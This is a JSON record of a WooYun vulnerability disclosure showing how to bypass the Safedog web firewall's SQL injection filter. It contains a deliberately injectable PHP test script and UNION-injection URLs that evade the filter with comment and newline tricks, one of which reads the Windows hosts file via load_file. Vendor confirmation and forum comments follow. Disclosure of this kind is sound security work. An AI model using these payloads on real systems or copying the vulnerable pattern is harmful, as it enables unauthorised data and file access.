{"id": 2225, "wybug_id": "wooyun-2015-0122601", "wybug_title": "Bypass安全狗SQL的UNION注入", "wybug_corp": "安全狗", "wybug_author": "路人甲", "wybug_date": "2015-06-24 23:59", "wybug_open_date": "2015-09-23 09:26", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向公众公开  简要描述： 让自己无路可走！！！！ 详细说明：  版本：\n\n官网Apache最新版.3.1.09924测试脚本：test.php\n<?$id = $_REQUEST['id'];if(!$conn = @mysql_connect(\"localhost\", \"root\", \"123456\"))die('<font size=+1>An Error Occured</font><hr>unable to connect to the database.');$text = \"select * from test.user where id=\".$id;$rs = mysql_query ($text,$conn);while($rom = mysql_fetch_array($rs)){echo $rom[\"username\"];}?>\n\nhttp://192.168.10.165/test.php?id=4 and 1=2 union select 1,2,3,4,5,6,7,8,9,10\n\n\n从防护日志中 ：\n192.168.10.1访问192.168.10.165,拦截原因:防止复杂的and or 方式注入规则二,可疑内容:4 and 1\n首先来绕过 and 1 这个拦截策略将and 1=1 改成 and%23fuck%0a1=2这里使用 ：\nhttp://192.168.10.165/test.php?id=4+and%23fuck%0a1=2+union+select+1,2,3,4,5,6,7,8,9,10\n但是还是被拦截了，但这时防护日志是这样的：\n192.168.10.1访问192.168.10.165,拦截原因:防止SQL联合查询,可疑内容:union select 1,2,3,4,5,6,7,8,9,10\nOK，还是能绕过将select 改成 %23qfuck%0Aselect完整URL: \nhttp://192.168.10.165/test.php?id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,2,3,4,5,6,7,8,9,10\n这时已经成功绕过。\n\n来读取个本地文件试试C:\\WINDOWS\\system32\\drivers\\etc\\hosts\nhttp://192.168.10.165/test.php?id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10\n\n\n   漏洞证明：  \n\n\nhttp://192.168.10.165/test.php?id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10\n   修复方案：  更新规则   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-06-25 09:25 厂商回复： 最近乌云的小伙伴真是太给力了，感谢大家的反馈，我们将尽快修复。再次赞一下乌云的小伙伴！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-25 00:25 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  对于这种人，那纯属神经病！    \n     2015-06-25 10:19 |    \t\ttestKaI \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        )\t\t \n  又少了一招打狗棒法    \n     2015-06-28 11:09 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  为了7rank提交有意思？摸摸自己的良心问问自己这洞是你挖出来的吗？    \n     2015-06-28 11:12 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 目标是当个农民)\t\t \n  对于这种人，那纯属神经病！     \n     2015-06-29 13:15 |    \t\t小菜大师 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  哎  这种人也老火  挖不出来漏洞也只能提交这种了    \n     2015-06-29 23:30 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Up)\t\t \n  对于这种人，那纯属神经病！    \n     2015-06-30 11:11 |    \t\t二愣子 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:22        | 毛毛你是个好姑娘)\t\t \n  对于这种人，我只想说“请联系我”    \n     2015-07-02 00:55 |    \t\t草榴社区 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:26        | 未满18周岁,不准进入.)\t\t \n  为了7rank提交有意思？摸摸自己的良心问问自己这洞是你挖出来的吗？     \n     2015-09-23 09:52 |    \t\tMark0smith \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 我更像是一个小松鼠)\t\t \n  #fuckAnd+1=2+    \n     2015-09-23 10:01 |    \t\tJ0kER \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:13        | 上海--求职)\t\t \n  洞主应该分析下原理    \n     2015-09-23 10:13 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        | 安全是什么...)\t\t \n  - - 给不给留活路啊    \n     2015-09-23 21:57 |    \t\t白无常 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:5        )\t\t \n  洞主怕被骂，路人甲= =    \n     2015-09-23 22:31 |    \t\t小2b \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 努力赚钱)\t\t \n  为了7rank提交有意思？摸摸自己的良心问问自己这洞是你挖出来的吗？    \n     2015-09-24 03:03 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:13        | 像个傻瓜似的，为什么。)\t\t \n  为了7rank提交有意思？摸摸自己的良心问问自己这洞是你挖出来的吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}